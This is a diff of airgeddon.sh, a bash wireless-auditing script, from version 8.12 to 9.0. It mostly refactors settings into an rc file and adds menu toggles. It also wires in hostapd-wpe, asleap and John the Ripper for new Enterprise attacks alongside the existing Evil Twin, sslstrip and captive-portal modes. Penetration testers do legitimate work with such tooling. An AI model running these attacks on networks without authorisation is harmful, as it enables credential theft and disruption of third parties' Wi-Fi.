@@ -2,22 +2,10 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20181101
-#Version......: 8.12
+#Date.........: 20190119
+#Version......: 9.0
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
-
-#Enabled with extra-verbose mode 2 / Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
-debug_mode=0
-
-#Enabled 1 / Disabled 0 - Auto update feature (it has no effect on debug mode) - Default value 1
-auto_update=0
-
-#Enabled 1 / Disabled 0 - Auto change language feature - Default value 1
-auto_change_language=1
-
-#Enabled 1 / Disabled 0 - Allow colorized output - Default value 1
-allow_colorization=1
 
 #Language vars
 #Change this line to select another default language. Select one from available values in array
@@ -46,6 +34,7 @@ essential_tools_names=(
 						"airodump-ng"
 						"aircrack-ng"
 						"xterm"
+						"ip"
 					)
 
 optional_tools_names=(
@@ -70,6 +59,9 @@ optional_tools_names=(
 						"bettercap"
 						"beef"
 						"packetforge-ng"
+						"hostapd-wpe"
+						"asleap"
+						"john"
 					)
 
 update_tools=("curl")
@@ -83,6 +75,7 @@ declare -A possible_package_names=(
 									[${essential_tools_names[5]}]="aircrack-ng" #airodump-ng
 									[${essential_tools_names[6]}]="aircrack-ng" #aircrack-ng
 									[${essential_tools_names[7]}]="xterm" #xterm
+									[${essential_tools_names[8]}]="iproute2" #ip
 									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
 									[${optional_tools_names[1]}]="crunch" #crunch
 									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
@@ -104,6 +97,9 @@ declare -A possible_package_names=(
 									[${optional_tools_names[18]}]="bettercap" #bettercap
 									[${optional_tools_names[19]}]="beef-xss / beef-project" #beef
 									[${optional_tools_names[20]}]="aircrack-ng" #packetforge-ng
+									[${optional_tools_names[21]}]="hostapd-wpe" #hostapd-wpe
+									[${optional_tools_names[22]}]="asleap" #asleap
+									[${optional_tools_names[23]}]="john" #john
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -113,8 +109,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="8.12"
-language_strings_expected_version="8.12-1"
+airgeddon_version="9.0"
+language_strings_expected_version="9.0-1"
 standardhandshake_filename="handshake-01.cap"
 timeout_capture_handshake="20"
 tmpdir="/tmp/"
@@ -126,6 +122,7 @@ pending_of_translation="[PoT]"
 escaped_pending_of_translation="\[PoT\]"
 standard_resolution="1024x768"
 curl_404_error="404: Not Found"
+rc_file=".airgeddonrc"
 language_strings_file="language_strings.sh"
 broadcast_mac="FF:FF:FF:FF:FF:FF"
 
@@ -153,6 +150,11 @@ hccapx_tool="cap2hccapx"
 possible_hccapx_converter_known_locations=(
 										"/usr/lib/hashcat-utils/${hccapx_tool}.bin"
 									)
+
+#john the ripper vars
+jtr_tmp_simple_name_file="jtrtmp"
+jtr_pot_tmp="${jtr_tmp_simple_name_file}.pot"
+jtr_output_file="${jtr_tmp_simple_name_file}.out"
 
 #WEP vars
 wep_data="wepdata"
@@ -227,7 +229,11 @@ beef_pass="airgeddon"
 beef_db="beef.db"
 beef_installation_url="https://github.com/beefproject/beef/wiki/Installation"
 hostapd_file="ag.hostapd.conf"
-control_file="ag.control.sh"
+hostapd_wpe_file="ag.hostapd_wpe.conf"
+hostapd_wpe_log="ag.hostapd_wpe.log"
+control_et_file="ag.et_control.sh"
+control_enterprise_file="ag.enterprise_control.sh"
+enterprisedir="enterprise/"
 webserver_file="ag.lighttpd.conf"
 webdir="www/"
 indexfile="index.htm"
@@ -236,8 +242,11 @@ cssfile="portal.css"
 jsfile="portal.js"
 attemptsfile="ag.et_attempts.txt"
 currentpassfile="ag.et_currentpass.txt"
-successfile="ag.et_success.txt"
-processesfile="ag.et_processes.txt"
+et_successfile="ag.et_success.txt"
+enterprise_successfile="ag.enterprise_success.txt"
+et_processesfile="ag.et_processes.txt"
+enterprise_processesfile="ag.enterprise_processes.txt"
+asleap_pot_tmp="ag.asleap_tmp.txt"
 channelfile="ag.et_channel.txt"
 possible_dhcp_leases_files=(
 								"/var/lib/dhcp/dhcpd.leases"
@@ -268,6 +277,7 @@ known_compatible_distros=(
 							"BlackArch"
 							"Cyborg"
 							"Ubuntu"
+							"Mint"
 							"Debian"
 							"SuSE"
 							"CentOS"
@@ -285,19 +295,22 @@ known_arm_compatible_distros=(
 							)
 
 #Hint vars
-declare main_hints=(128 134 163 437 438 442 445 516)
+declare main_hints=(128 134 163 437 438 442 445 516 590)
 declare dos_hints=(129 131 133)
 declare handshake_hints=(127 130 132 136)
 declare handshake_attack_hints=(142)
-declare decrypt_hints=(171 178 179 208 244 163)
+declare decrypt_hints=(171 179 208 244 163)
+declare personal_decrypt_hints=(171 178 179 208 244 163)
+declare enterprise_decrypt_hints=(171 179 208 244 163 610)
 declare select_interface_hints=(246)
 declare language_hints=(250 438)
-declare option_hints=(445 250 448 477)
+declare option_hints=(445 250 448 477 591)
 declare evil_twin_hints=(254 258 264 269 309 328 400 509)
 declare evil_twin_dos_hints=(267 268 509)
 declare beef_hints=(408)
 declare wps_hints=(342 343 344 356 369 390 490)
 declare wep_hints=(431 429 428 432 433)
+declare enterprise_hints=(112 332 483 518)
 
 #Charset vars
 crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
@@ -305,19 +318,6 @@ crunch_uppercasecharset="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 crunch_numbercharset="0123456789"
 crunch_symbolcharset="!#$%/=?{}[]-*:;"
 hashcat_charsets=("?l" "?u" "?d" "?s")
-
-#Colors vars
-green_color="\033[1;32m"
-green_color_title="\033[0;32m"
-red_color="\033[1;31m"
-red_color_slim="\033[0;031m"
-blue_color="\033[1;34m"
-cyan_color="\033[1;36m"
-brown_color="\033[0;33m"
-yellow_color="\033[1;33m"
-pink_color="\033[1;35m"
-white_color="\e[1;97m"
-normal_color="\e[1;0m"
 
 #Check coherence between script and language_strings file
 function check_language_strings() {
@@ -521,67 +521,60 @@ function language_strings_handling_messages() {
 	language_strings_key_to_continue["TURKISH"]="Devam etmek için [Enter] tuşuna basın..."
 }
 
-#Toggle language auto-detection feature
-function auto_change_language_toggle() {
+#Set messages for configuration variables handling
+function configuration_variables_handling_messages() {
 
-	debug_print
-
-	if [ "${auto_change_language}" -eq 1 ]; then
-		sed -ri 's:(auto_change_language)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
-		if ! grep -E "auto_[c]hange_language=0" "${scriptfolder}${scriptname}" > /dev/null; then
-			return 1
-		fi
-		auto_change_language=$((auto_change_language-1))
-	else
-		sed -ri 's:(auto_change_language)=(0):\1=1:' "${scriptfolder}${scriptname}" 2> /dev/null
-		if ! grep -E "auto_[c]hange_language=1" "${scriptfolder}${scriptname}" > /dev/null; then
-			return 1
-		fi
-		auto_change_language=$((auto_change_language+1))
-	fi
-	return 0
+	declare -gA error_on_configuration_variable
+	error_on_configuration_variable["ENGLISH"]="An error occurred with configuration options variables. Please check ${rc_file} file or command line flags. Invalid value on ${normal_color}${option_var_with_error}${red_color} variable"
+	error_on_configuration_variable["SPANISH"]="Ha habido un error con las variables de configuración de las opciones. Por favor revisa el fichero ${rc_file} o los flags de la línea de comandos. Valor no válido en la variable ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["FRENCH"]="Une erreur s'est produite avec les variables de configuration des options. Veuillez vérifier le fichier ${rc_file} ou les flags de la ligne de commande. Valeur invalide dans la variable ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["CATALAN"]="Hi ha hagut un error amb les variables de configuració de les opcions. Si us plau revisa el fitxer ${rc_file} o els flags de la línia d'ordres. Valor no vàlid en la variable ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["PORTUGUESE"]="Existe um erro com a configuração das variáveis. Por favor, verifique o arquivo ${rc_file} ou os argumentos na linha de comando. Valor inválido na variável: ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["RUSSIAN"]="Произошла ошибка с опциями переменных конфигурации. Пожалуйста, проверьте файл ${rc_file} или флаги командной строки. Неверное значение в переменной ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["GREEK"]="Παρουσιάστηκε σφάλμα στο αρχείο με τις μεταβλητές διαμόρφωσης των επιλογών του script. Ελέγξτε το αρχείο ${rc_file} ή τα flags της γραμμής εντολών. Εμφανίστηκε μη έγκυρη τιμή στη μεταβλητή ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["ITALIAN"]="Si è verificato un errore nelle variabili di configurazione delle opzioni. Controlla il file ${rc_file} o i flag inseriti nel comando. Valore non valido nella variabile ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["POLISH"]="Wystąpił błąd związany ze zmiennymi opcji konfiguracji. Sprawdź plik ${rc_file} lub parametry linii poleceń. Nieprawidłowa wartość zmiennej ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["GERMAN"]="Bei den Konfigurationsvariablen der Optionen ist ein Fehler aufgetreten. Bitte überprüfen Sie die Datei ${rc_file} oder die Befehlszeilenflaggen. Ungültiger Wert in Variable ${normal_color}${option_var_with_error}"
+	error_on_configuration_variable["TURKISH"]="Değişken seçeneklerinin yapılandırılması sırasında bir hata meydana geldi. Lütfen ${rc_file} dosyasını veya komut satırı flags'larını kontrol edin. ${normal_color}${option_var_with_error}${red_color} değişkeninde geçersiz değer"
 }
 
-#Toggle allow colorization feature
-function allow_colorization_toggle() {
+#Generic toggle option function
+function option_toggle() {
 
 	debug_print
 
-	if [ "${allow_colorization}" -eq 1 ]; then
-		sed -ri 's:(allow_colorization)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
-		if ! grep -E "allow_[c]olorization=0" "${scriptfolder}${scriptname}" > /dev/null; then
+	local option_var_name="${1}"
+	local option_var_value="${!1}"
+
+	if "${option_var_value:-true}"; then
+		sed -ri "s:(${option_var_name})=(true):\1=false:" "${scriptfolder}${rc_file}" 2> /dev/null
+		if ! grep "${option_var_name}=false" "${scriptfolder}${rc_file}" > /dev/null; then
 			return 1
 		fi
-		allow_colorization=$((allow_colorization-1))
+		export ${option_var_name}=false
 	else
-		sed -ri 's:(allow_colorization)=(0):\1=1:' "${scriptfolder}${scriptname}" 2> /dev/null
-		if ! grep -E "allow_[c]olorization=1" "${scriptfolder}${scriptname}" > /dev/null; then
+		sed -ri "s:(${option_var_name})=(false):\1=true:" "${scriptfolder}${rc_file}" 2> /dev/null
+		if ! grep "${option_var_name}=true" "${scriptfolder}${rc_file}" > /dev/null; then
 			return 1
 		fi
-		allow_colorization=$((allow_colorization+1))
+		export ${option_var_name}=true
 	fi
-	initialize_colorized_output
-	return 0
-}
 
-#Toggle auto-update feature
-function auto_update_toggle() {
+	case "${option_var_name}" in
+		"AIRGEDDON_BASIC_COLORS")
+			remap_colors
+		;;
+		"AIRGEDDON_EXTENDED_COLORS")
+			initialize_extended_colorized_output
+		;;
+		"AIRGEDDON_5GHZ_ENABLED")
+			phy_interface=$(physical_interface_finder "${interface}")
+			check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+			secondary_phy_interface=$(physical_interface_finder "${secondary_wifi_interface}")
+			check_interface_supported_bands "${secondary_phy_interface}" "secondary_wifi_interface"
+		;;
+	esac
 
-	debug_print
-
-	if [ "${auto_update}" -eq 1 ]; then
-		sed -ri 's:(auto_update)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
-		if ! grep -E "auto_[u]pdate=0" "${scriptfolder}${scriptname}" > /dev/null; then
-			return 1
-		fi
-		auto_update=$((auto_update-1))
-	else
-		sed -ri 's:(auto_update)=(0):\1=1:' "${scriptfolder}${scriptname}" 2> /dev/null
-		if ! grep -E "auto_[u]pdate=1" "${scriptfolder}${scriptname}" > /dev/null; then
-			return 1
-		fi
-		auto_update=$((auto_update+1))
-	fi
 	return 0
 }
 
@@ -609,12 +602,15 @@ function set_permanent_language() {
 #Print the current line of where this was called and the function's name. Applies to some (which are useful) functions
 function debug_print() {
 
-	if [ ${debug_mode} -eq 2 ]; then
+	if "${AIRGEDDON_DEBUG_MODE:-true}"; then
 
 		declare excluded_functions=(
+								"airmon_fix"
 								"ask_yesno"
 								"check_pending_of_translation"
+								"clean_env_vars"
 								"contains_element"
+								"create_rcfile"
 								"echo_blue"
 								"echo_brown"
 								"echo_cyan"
@@ -625,7 +621,11 @@ function debug_print() {
 								"echo_red_slim"
 								"echo_white"
 								"echo_yellow"
+								"env_vars_initialization"
+								"env_vars_validation"
 								"generate_dynamic_line"
+								"initialize_colors"
+								"initialize_script_settings"
 								"interrupt_checkpoint"
 								"language_strings"
 								"last_echo"
@@ -635,6 +635,7 @@ function debug_print() {
 								"print_simple_separator"
 								"read_yesno"
 								"remove_warnings"
+								"set_script_folder_and_name"
 								"special_text_missed_optional_tool"
 								"store_array"
 								"under_construction_message"
@@ -678,7 +679,7 @@ function special_text_missed_optional_tool() {
 	declare -a required_tools=("${!3}")
 
 	allowed_menu_option=1
-	if [ ${debug_mode} -eq 0 ]; then
+	if ! "${AIRGEDDON_DEVELOPMENT_MODE:-false}"; then
 		tools_needed="${optionaltool_needed[${1}]}"
 		for item in "${required_tools[@]}"; do
 			if [ "${optional_tools[${item}]}" -eq 0 ]; then
@@ -933,7 +934,7 @@ function wash_json_scan() {
 
 	wash_band_modifier=""
 	if [ "${wps_channel}" -gt 14 ]; then
-		if [ "${interface_supported_bands}" = "${band_24ghz}" ]; then
+		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 			echo
 			language_strings "${language}" 515 "red"
 			language_strings "${language}" 115 "read"
@@ -1187,7 +1188,7 @@ function search_in_pin_database() {
 			bssid_found_in_db=1
 			arrpins=(${PINDB[${item//[[:space:]]/ }]})
 			for item2 in "${arrpins[@]}"; do
-				counter_pins_found=$((counter_pins_found+1))
+				counter_pins_found=$((counter_pins_found + 1))
 				pins_found+=(${item2})
 				fill_wps_data_array "${wps_bssid}" "Database" "${item2}"
 			done
@@ -1211,18 +1212,19 @@ function check_interface_supported_bands() {
 
 	debug_print
 
-	case "${2}" in
-		"main_wifi_interface")
-			interface_supported_bands="${band_24ghz}"
-			if get_5ghz_band_info_from_phy_interface "${1}"; then
-				interface_supported_bands+=", ${band_5ghz}"
-			fi
+	get_5ghz_band_info_from_phy_interface "${1}"
+	case "$?" in
+		"0")
+			interfaces_band_info["${2}","5Ghz_allowed"]=1
+			interfaces_band_info["${2}","text"]="${band_24ghz}, ${band_5ghz}"
 		;;
-		"secondary_wifi_interface")
-			secondary_interface_supported_bands="${band_24ghz}"
-			if get_5ghz_band_info_from_phy_interface "${1}"; then
-				secondary_interface_supported_bands+=", ${band_5ghz}"
-			fi
+		"1")
+			interfaces_band_info["${2}","5Ghz_allowed"]=0
+			interfaces_band_info["${2}","text"]="${band_24ghz}"
+		;;
+		"2")
+			interfaces_band_info["${2}","5Ghz_allowed"]=0
+			interfaces_band_info["${2}","text"]="${band_24ghz}, ${band_5ghz} (${red_color}${disabled_text[${language}]}${pink_color})"
 		;;
 	esac
 }
@@ -1233,7 +1235,11 @@ function get_5ghz_band_info_from_phy_interface() {
 	debug_print
 
 	if iw phy "${1}" info 2> /dev/null | grep "5200 MHz" > /dev/null; then
-		return 0
+		if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
+			return 0
+		else
+			return 2
+		fi
 	fi
 
 	return 1
@@ -1254,7 +1260,7 @@ function prepare_et_monitor() {
 	iwconfig "${iface_monitor_et_deauth}" channel "${channel}" > /dev/null 2>&1
 }
 
-#Assure the mode of the interface before the Evil Twin process
+#Assure the mode of the interface before the Evil Twin or Enterprise process
 function prepare_et_interface() {
 
 	debug_print
@@ -1280,7 +1286,7 @@ function prepare_et_interface() {
 	fi
 }
 
-#Restore the state of the interfaces after Evil Twin process
+#Restore the state of the interfaces after Evil Twin or Enterprise process
 function restore_et_interface() {
 
 	debug_print
@@ -1560,20 +1566,45 @@ function option_menu() {
 	print_simple_separator
 	language_strings "${language}" 78
 	print_simple_separator
-	if [ "${auto_update}" -eq 1 ]; then
+	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
 		language_strings "${language}" 455
 	else
 		language_strings "${language}" 449
 	fi
-	if [ "${allow_colorization}" -eq 1 ]; then
+	if "${AIRGEDDON_SKIP_INTRO:-true}"; then
+		language_strings "${language}" 565
+	else
+		language_strings "${language}" 566
+	fi
+	if "${AIRGEDDON_BASIC_COLORS:-true}"; then
+		language_strings "${language}" 557
+	else
+		language_strings "${language}" 556
+	fi
+	if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
 		language_strings "${language}" 456
 	else
 		language_strings "${language}" 450
 	fi
-	if [ "${auto_change_language}" -eq 1 ]; then
+	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
 		language_strings "${language}" 468
 	else
 		language_strings "${language}" 467
+	fi
+	if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
+		language_strings "${language}" 573
+	else
+		language_strings "${language}" 574
+	fi
+	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
+		language_strings "${language}" 584
+	else
+		language_strings "${language}" 585
+	fi
+	if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
+		language_strings "${language}" 592
+	else
+		language_strings "${language}" 593
 	fi
 	language_strings "${language}" 447
 	print_hint ${current_menu}
@@ -1587,10 +1618,10 @@ function option_menu() {
 			language_menu
 		;;
 		2)
-			if [ "${auto_update}" -eq 1 ]; then
+			if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
 				ask_yesno 457 "no"
 				if [ "${yesno}" = "y" ]; then
-					if auto_update_toggle; then
+					if option_toggle "AIRGEDDON_AUTO_UPDATE"; then
 						echo
 						language_strings "${language}" 461 "blue"
 					else
@@ -1603,7 +1634,7 @@ function option_menu() {
 				language_strings "${language}" 459 "yellow"
 				ask_yesno 458 "no"
 				if [ "${yesno}" = "y" ]; then
-					if auto_update_toggle; then
+					if option_toggle "AIRGEDDON_AUTO_UPDATE"; then
 						echo
 						language_strings "${language}" 460 "blue"
 					else
@@ -1615,15 +1646,69 @@ function option_menu() {
 			fi
 		;;
 		3)
+			if "${AIRGEDDON_SKIP_INTRO:-true}"; then
+				ask_yesno 569 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_SKIP_INTRO"; then
+						echo
+						language_strings "${language}" 571 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			else
+				ask_yesno 570 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_SKIP_INTRO"; then
+						echo
+						language_strings "${language}" 572 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		4)
+			if "${AIRGEDDON_BASIC_COLORS:-true}"; then
+				ask_yesno 558 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_BASIC_COLORS"; then
+						echo
+						language_strings "${language}" 560 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			else
+				ask_yesno 559 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_BASIC_COLORS"; then
+						echo
+						language_strings "${language}" 561 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		5)
 			if ! hash ccze 2> /dev/null; then
 				echo
 				language_strings "${language}" 464 "yellow"
 			fi
 
-			if [ "${allow_colorization}" -eq 1 ]; then
+			if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
 				ask_yesno 462 "yes"
 				if [ "${yesno}" = "y" ]; then
-					if allow_colorization_toggle; then
+					if option_toggle "AIRGEDDON_EXTENDED_COLORS"; then
 						echo
 						language_strings "${language}" 466 "blue"
 					else
@@ -1635,9 +1720,13 @@ function option_menu() {
 			else
 				ask_yesno 463 "yes"
 				if [ "${yesno}" = "y" ]; then
-					if allow_colorization_toggle; then
+					if option_toggle "AIRGEDDON_EXTENDED_COLORS"; then
 						echo
 						language_strings "${language}" 465 "blue"
+						if ! "${AIRGEDDON_BASIC_COLORS:-true}"; then
+							echo
+							language_strings "${language}" 562 "yellow"
+						fi
 					else
 						echo
 						language_strings "${language}" 417 "red"
@@ -1646,11 +1735,11 @@ function option_menu() {
 				fi
 			fi
 		;;
-		4)
-			if [ "${auto_change_language}" -eq 1 ]; then
+		6)
+			if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
 				ask_yesno 469 "no"
 				if [ "${yesno}" = "y" ]; then
-					if auto_change_language_toggle; then
+					if option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"; then
 						echo
 						language_strings "${language}" 473 "blue"
 					else
@@ -1664,7 +1753,7 @@ function option_menu() {
 				language_strings "${language}" 471 "yellow"
 				ask_yesno 470 "no"
 				if [ "${yesno}" = "y" ]; then
-					if auto_change_language_toggle; then
+					if option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"; then
 						echo
 						language_strings "${language}" 472 "blue"
 					else
@@ -1675,7 +1764,88 @@ function option_menu() {
 				fi
 			fi
 		;;
-		5)
+		7)
+			if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
+				ask_yesno 577 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_SILENT_CHECKS"; then
+						echo
+						language_strings "${language}" 579 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			else
+				ask_yesno 578 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_SILENT_CHECKS"; then
+						echo
+						language_strings "${language}" 580 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		8)
+			if "${AIRGEDDON_PRINT_HINTS:-true}"; then
+				ask_yesno 586 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_PRINT_HINTS"; then
+						echo
+						language_strings "${language}" 588 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			else
+				ask_yesno 587 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_PRINT_HINTS"; then
+						echo
+						language_strings "${language}" 589 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		9)
+			if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
+				ask_yesno 596 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_5GHZ_ENABLED"; then
+						echo
+						language_strings "${language}" 598 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			else
+				ask_yesno 597 "yes"
+				if [ "${yesno}" = "y" ]; then
+					if option_toggle "AIRGEDDON_5GHZ_ENABLED"; then
+						echo
+						language_strings "${language}" 599 "blue"
+					else
+						echo
+						language_strings "${language}" 417 "red"
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		10)
 			ask_yesno 478 "yes"
 			if [ "${yesno}" = "y" ]; then
 				get_current_permanent_language
@@ -1683,12 +1853,10 @@ function option_menu() {
 					echo
 					language_strings "${language}" 480 "red"
 				else
-					local auto_change_value
-					auto_change_value=$(grep "auto_change_language=" "${scriptfolder}${scriptname}" | head -n 1 | awk -F "=" '{print $2}')
-					if [ "${auto_change_value}" -eq 1 ]; then
+					if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
 						echo
 						language_strings "${language}" 479 "yellow"
-						auto_change_language_toggle
+						option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"
 					fi
 
 					if set_permanent_language; then
@@ -1757,7 +1925,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="SPANISH"
-				language_strings "${language}" 84 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1766,7 +1934,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="FRENCH"
-				language_strings "${language}" 112 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1775,7 +1943,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="CATALAN"
-				language_strings "${language}" 117 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1784,7 +1952,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="PORTUGUESE"
-				language_strings "${language}" 248 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1793,7 +1961,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="RUSSIAN"
-				language_strings "${language}" 307 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1802,7 +1970,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="GREEK"
-				language_strings "${language}" 332 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1811,7 +1979,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="ITALIAN"
-				language_strings "${language}" 483 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1820,7 +1988,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="POLISH"
-				language_strings "${language}" 57 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1829,7 +1997,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="GERMAN"
-				language_strings "${language}" 260 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1838,7 +2006,7 @@ function language_menu() {
 				language_strings "${language}" 251 "red"
 			else
 				language="TURKISH"
-				language_strings "${language}" 518 "yellow"
+				language_strings "${language}" 83 "yellow"
 			fi
 			language_strings "${language}" 115 "read"
 		;;
@@ -1899,7 +2067,7 @@ function set_chipset() {
 	fi
 }
 
-#Manage and validate the prerequisites for DoS Pursuit mode integrated on Evil Twin attacks
+#Manage and validate the prerequisites for DoS Pursuit mode integrated on Evil Twin and Enterprise attacks
 function dos_pursuit_mode_et_handler() {
 
 	debug_print
@@ -1916,11 +2084,16 @@ function dos_pursuit_mode_et_handler() {
 
 		if select_secondary_et_interface "dos_pursuit_mode"; then
 
-			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${secondary_interface_supported_bands}" = "${band_24ghz}" ]]; then
+			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
 				echo
 				language_strings "${language}" 394 "red"
 				language_strings "${language}" 115 "read"
-				return_to_et_main_menu=1
+
+				if [ -n "${enterprise_mode}" ]; then
+					return_to_enterprise_main_menu=1
+				else
+					return_to_et_main_menu=1
+				fi
 				return 1
 			fi
 
@@ -1932,7 +2105,11 @@ function dos_pursuit_mode_et_handler() {
 				language_strings "${language}" 115 "read"
 				echo
 				if ! monitor_option "${secondary_wifi_interface}"; then
-					return_to_et_main_menu=1
+					if [ -n "${enterprise_mode}" ]; then
+						return_to_enterprise_main_menu=1
+					else
+						return_to_et_main_menu=1
+					fi
 					return 1
 				else
 					echo
@@ -1952,7 +2129,7 @@ function dos_pursuit_mode_et_handler() {
 	return 0
 }
 
-#Secondary interface selection menu for Evil Twin attacks
+#Secondary interface selection menu for Evil Twin and Enterprise attacks
 function select_secondary_et_interface() {
 
 	debug_print
@@ -1961,25 +2138,41 @@ function select_secondary_et_interface() {
 		return 1
 	fi
 
-	current_menu="evil_twin_attacks_menu"
+	if [ "${return_to_enterprise_main_menu}" -eq 1 ]; then
+		return 1
+	fi
+
 	clear
-	case ${et_mode} in
-		"et_onlyap")
-			language_strings "${language}" 270 "title"
-		;;
-		"et_sniffing")
-			language_strings "${language}" 291 "title"
-		;;
-		"et_sniffing_sslstrip")
-			language_strings "${language}" 292 "title"
-		;;
-		"et_sniffing_sslstrip2")
-			language_strings "${language}" 397 "title"
-		;;
-		"et_captive_portal")
-			language_strings "${language}" 293 "title"
-		;;
-	esac
+	if [ -n "${enterprise_mode}" ]; then
+		current_menu="enterprise_attacks_menu"
+		case ${enterprise_mode} in
+			"smooth")
+				language_strings "${language}" 522 "title"
+			;;
+			"noisy")
+				language_strings "${language}" 523 "title"
+			;;
+		esac
+	else
+		current_menu="evil_twin_attacks_menu"
+		case ${et_mode} in
+			"et_onlyap")
+				language_strings "${language}" 270 "title"
+			;;
+			"et_sniffing")
+				language_strings "${language}" 291 "title"
+			;;
+			"et_sniffing_sslstrip")
+				language_strings "${language}" 292 "title"
+			;;
+			"et_sniffing_sslstrip2")
+				language_strings "${language}" 397 "title"
+			;;
+			"et_captive_portal")
+				language_strings "${language}" 293 "title"
+			;;
+		esac
+	fi
 
